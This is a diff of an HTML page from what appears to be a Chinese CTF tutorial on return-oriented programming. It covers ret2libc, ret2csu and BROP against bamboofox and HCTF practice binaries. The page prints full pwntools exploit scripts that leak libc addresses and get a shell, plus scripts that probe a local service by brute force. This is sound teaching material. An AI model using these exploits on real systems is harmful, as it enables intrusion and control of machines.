+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> system_plt<span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-sh.interactive()</code></pre><p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>
 <p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p>
 <h4 id="例-2"><a href="#例-2" class="headerlink" title="例 2"></a>例 2</h4><p>这里以 bamboofox 中的 ret2libc2 为例</p>
 <p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank" rel="noopener">ret2libc2</a></p>
 <p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下</p>
-<pre><code>##!/usr/bin/env python
-from pwn import *
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">##!/usr/bin/env python</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-sh = process('./ret2libc2')
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc2'</span><span class="token punctuation">)</span>
 
-gets_plt = 0x08048460
-system_plt = 0x08048490
-pop_ebx = 0x0804843d
-buf2 = 0x804a080
-payload = flat(
-    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
-sh.sendline(payload)
-sh.sendline('/bin/sh')
-sh.interactive()</code></pre><p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p>
+gets_plt <span class="token operator">=</span> <span class="token number">0x08048460</span>
+system_plt <span class="token operator">=</span> <span class="token number">0x08048490</span>
+pop_ebx <span class="token operator">=</span> <span class="token number">0x0804843d</span>
+buf2 <span class="token operator">=</span> <span class="token number">0x804a080</span>
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
+    <span class="token punctuation">[</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> gets_plt<span class="token punctuation">,</span> pop_ebx<span class="token punctuation">,</span> buf2<span class="token punctuation">,</span> system_plt<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">,</span> buf2<span class="token punctuation">]</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p>
 <h4 id="例-3"><a href="#例-3" class="headerlink" title="例 3"></a>例 3</h4><p>这里以 bamboofox 中的 ret2libc3 为例</p>
 <p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3" target="_blank" rel="noopener">ret2libc3</a></p>
 <p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护</p>
@@ -975,17 +987,18 @@ sh.interactive()</code></pre><p>需要注意的是，我这里向程序中 bss �
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)</code></pre><p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  int v4; // [sp+1Ch] [bp-64h]@1
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>
 
-  setvbuf(stdout, 0, 2, 0);
-  setvbuf(stdin, 0, 1, 0);
-  puts("No surprise anymore, system disappeard QQ.");
-  printf("Can you find it !?");
-  gets((char *)&amp;v4);
-  return 0;
-}</code></pre><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No surprise anymore, system disappeard QQ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can you find it !?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>
 <ul>
 <li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
 <li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li>
@@ -1007,33 +1020,34 @@ sh.interactive()</code></pre><p>需要注意的是，我这里向程序中 bss �
 <li>触发栈溢出执行 system(‘/bin/sh’)</li>
 </ul>
 <p>exp 如下</p>
-<pre><code>#!/usr/bin/env python
-from pwn import *
-from LibcSearcher import LibcSearcher
-sh = process('./ret2libc3')
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
 
-ret2libc3 = ELF('./ret2libc3')
+ret2libc3 <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>
 
-puts_plt = ret2libc3.plt['puts']
-libc_start_main_got = ret2libc3.got['__libc_start_main']
-main = ret2libc3.symbols['main']
+puts_plt <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+libc_start_main_got <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
+main <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
 
-print "leak libc_start_main_got addr and return to main again"
-payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
-sh.sendlineafter('Can you find it !?', payload)
+<span class="token keyword">print</span> <span class="token string">"leak libc_start_main_got addr and return to main again"</span>
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> puts_plt<span class="token punctuation">,</span> main<span class="token punctuation">,</span> libc_start_main_got<span class="token punctuation">]</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Can you find it !?'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
 
-print "get the related addr"
-libc_start_main_addr = u32(sh.recv()[0:4])
-libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
-libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
-system_addr = libcbase + libc.dump('system')
-binsh_addr = libcbase + libc.dump('str_bin_sh')
+<span class="token keyword">print</span> <span class="token string">"get the related addr"</span>
+libc_start_main_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span> libc_start_main_addr<span class="token punctuation">)</span>
+libcbase <span class="token operator">=</span> libc_start_main_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>
+system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
+binsh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
 
-print "get shell"
-payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
-sh.sendline(payload)
+<span class="token keyword">print</span> <span class="token string">"get shell"</span>
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">104</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-sh.interactive()</code></pre><h1 id="中级-ROP"><a href="#中级-ROP" class="headerlink" title="中级 ROP"></a>中级 ROP</h1><p>中级 ROP 主要是使用了一些比较巧妙的 Gadgets。</p>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="中级-ROP"><a href="#中级-ROP" class="headerlink" title="中级 ROP"></a>中级 ROP</h1><p>中级 ROP 主要是使用了一些比较巧妙的 Gadgets。</p>
 <h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p>
 <pre><code>.text:00000000004005C0 ; void _libc_csu_init(void)
 .text:00000000004005C0                 public __libc_csu_init
@@ -1090,12 +1104,13 @@ sh.interactive()</code></pre><h1 id="中级-ROP"><a href="#中级-ROP" class="he
     NX:       NX enabled
     PIE:      No PIE (0x400000)</code></pre><p>程序为 64 位，开启了堆栈不可执行保护。</p>
 <p>其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出</p>
-<pre><code>ssize_t vulnerable_function()
-{
-  char buf; // [sp+0h] [bp-80h]@1
+<pre class="line-numbers language-c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+0h] [bp-80h]@1</span>
 
-  return read(0, &amp;buf, 0x200uLL);
-}</code></pre><p>简单浏览下程序，发现程序中既没有 system 函数地址，也没有 /bin/sh 字符串，所以两者都需要我们自己去构造了。</p>
+  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>简单浏览下程序，发现程序中既没有 system 函数地址，也没有 /bin/sh 字符串，所以两者都需要我们自己去构造了。</p>
 <p><strong>注：这里我尝试在我本机使用 system 函数来获取 shell 失败了，应该是环境变量的问题，所以这里使用的是 execve 来获取 shell。</strong></p>
 <p>基本利用思路如下</p>
 <ul>
@@ -1105,63 +1120,64 @@ sh.interactive()</code></pre><h1 id="中级-ROP"><a href="#中级-ROP" class="he
 <li>再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘/bin/sh’) 获取 shell。</li>
 </ul>
 <p>exp 如下</p>
-<pre><code>from pwn import *
-from LibcSearcher import LibcSearcher
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
 
-#context.log_level = 'debug'
+<span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>
 
-level5 = ELF('./level5')
-sh = process('./level5')
+level5 <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span>
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span>
 
-write_got = level5.got['write']
-read_got = level5.got['read']
-main_addr = level5.symbols['main']
-bss_base = level5.bss()
-csu_front_addr = 0x0000000000400600
-csu_end_addr = 0x000000000040061A
-fakeebp = 'b' * 8
-
-
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-    # pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    payload = 'a' * 0x80 + fakeebp
-    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
-        r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_addr)
-    payload += 'a' * 0x38
-    payload += p64(last)
-    sh.send(payload)
-    sleep(1)
+write_got <span class="token operator">=</span> level5<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+read_got <span class="token operator">=</span> level5<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+main_addr <span class="token operator">=</span> level5<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
+bss_base <span class="token operator">=</span> level5<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
+csu_front_addr <span class="token operator">=</span> <span class="token number">0x0000000000400600</span>
+csu_end_addr <span class="token operator">=</span> <span class="token number">0x000000000040061A</span>
+fakeebp <span class="token operator">=</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">8</span>
 
 
-sh.recvuntil('Hello, World\n')
-## RDI, RSI, RDX, RCX, R8, R9, more on the stack
-## write(1,write_got,8)
-csu(0, 1, write_got, 8, write_got, 1, main_addr)
+<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">,</span> last<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true"># pop rbx,rbp,r12,r13,r14,r15</span>
+    <span class="token comment" spellcheck="true"># rbx should be 0,</span>
+    <span class="token comment" spellcheck="true"># rbp should be 1,enable not to jump</span>
+    <span class="token comment" spellcheck="true"># r12 should be the function we want to call</span>
+    <span class="token comment" spellcheck="true"># rdi=edi=r15d</span>
+    <span class="token comment" spellcheck="true"># rsi=r14</span>
+    <span class="token comment" spellcheck="true"># rdx=r13</span>
+    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x80</span> <span class="token operator">+</span> fakeebp
+    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
+        r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
+    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>
+    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
+    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>last<span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 
-write_addr = u64(sh.recv(8))
-libc = LibcSearcher('write', write_addr)
-libc_base = write_addr - libc.dump('write')
-execve_addr = libc_base + libc.dump('execve')
-log.success('execve_addr ' + hex(execve_addr))
-##gdb.attach(sh)
 
-## read(0,bss_base,16)
-## read execve_addr and /bin/sh\x00
-sh.recvuntil('Hello, World\n')
-csu(0, 1, read_got, 16, bss_base, 0, main_addr)
-sh.send(p64(execve_addr) + '/bin/sh\x00')
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Hello, World\n'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span>
+<span class="token comment" spellcheck="true">## write(1,write_got,8)</span>
+csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> write_got<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> write_got<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> main_addr<span class="token punctuation">)</span>
 
-sh.recvuntil('Hello, World\n')
-## execve(bss_base+8)
-csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
-sh.interactive()</code></pre><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><h4 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h4><p>在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法</p>
+write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span> write_addr<span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>
+execve_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'execve'</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'execve_addr '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>execve_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">##gdb.attach(sh)</span>
+
+<span class="token comment" spellcheck="true">## read(0,bss_base,16)</span>
+<span class="token comment" spellcheck="true">## read execve_addr and /bin/sh\x00</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Hello, World\n'</span><span class="token punctuation">)</span>
+csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> read_got<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> bss_base<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> main_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>execve_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Hello, World\n'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">## execve(bss_base+8)</span>
+csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> bss_base<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bss_base <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> main_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><h4 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h4><p>在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法</p>
 <h5 id="改进-1-提前控制-RBX-与-RBP"><a href="#改进-1-提前控制-RBX-与-RBP" class="headerlink" title="改进 1 - 提前控制 RBX 与 RBP"></a>改进 1 - 提前控制 RBX 与 RBP</h5><p>可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。</p>
 <h5 id="改进-2-多次利用"><a href="#改进-2-多次利用" class="headerlink" title="改进 2 - 多次利用"></a>改进 2 - 多次利用</h5><p>其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件</p>
 <ul>
@@ -1411,149 +1427,154 @@ syscall</code></pre><p>但通常来说，这样的方法都是比较困难的，
 <li>执行 execve 获取 shell，获取 execve 不一定在 plt 表中，此时攻击者就需要想办法执行系统调用了。</li>
 </ul>
 <h3 id="例子-4"><a href="#例子-4" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop" target="_blank" rel="noopener">HCTF2016 的出题人失踪了</a> 为例。基本思路如下</p>
-<h4 id="确定栈溢出长度"><a href="#确定栈溢出长度" class="headerlink" title="确定栈溢出长度"></a>确定栈溢出长度</h4><pre><code>def getbufferflow_length():
-    i = 1
-    while 1:
-        try:
-            sh = remote('127.0.0.1', 9999)
-            sh.recvuntil('WelCome my friend,Do you know password?\n')
-            sh.send(i * 'a')
-            output = sh.recv()
-            sh.close()
-            if not output.startswith('No password'):
-                return i - 1
-            else:
-                i += 1
-        except EOFError:
-            sh.close()
-            return i - 1</code></pre><p>根据上面，我们可以确定，栈溢出的长度为 72。同时，根据回显信息可以发现程序并没有开启 canary 保护，否则，就会有相应的报错内容。所以我们不需要执行 stack reading。</p>
+<h4 id="确定栈溢出长度"><a href="#确定栈溢出长度" class="headerlink" title="确定栈溢出长度"></a>确定栈溢出长度</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getbufferflow_length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    i <span class="token operator">=</span> <span class="token number">1</span>
+    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
+            sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'WelCome my friend,Do you know password?\n'</span><span class="token punctuation">)</span>
+            sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
+            output <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token operator">not</span> output<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'No password'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">return</span> i <span class="token operator">-</span> <span class="token number">1</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                i <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
+            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> i <span class="token operator">-</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>根据上面，我们可以确定，栈溢出的长度为 72。同时，根据回显信息可以发现程序并没有开启 canary 保护，否则，就会有相应的报错内容。所以我们不需要执行 stack reading。</p>
 <h4 id="寻找-stop-gadgets-1"><a href="#寻找-stop-gadgets-1" class="headerlink" title="寻找 stop gadgets"></a>寻找 stop gadgets</h4><p>寻找过程如下</p>
-<pre><code>def get_stop_addr(length):
-    addr = 0x400000
-    while 1:
-        try:
-            sh = remote('127.0.0.1', 9999)
-            sh.recvuntil('password?\n')
-            payload = 'a' * length + p64(addr)
-            sh.sendline(payload)
-            sh.recv()
-            sh.close()
-            print 'one success addr: 0x%x' % (addr)
-            return addr
-        except Exception:
-            addr += 1
-            sh.close()</code></pre><p>这里我们直接尝试 64 位程序没有开启 PIE 的情况，因为一般是这个样子的，，，如果开启了，，那就按照开启了的方法做，，结果发现了不少，，我选择了一个貌似返回到源程序中的地址</p>
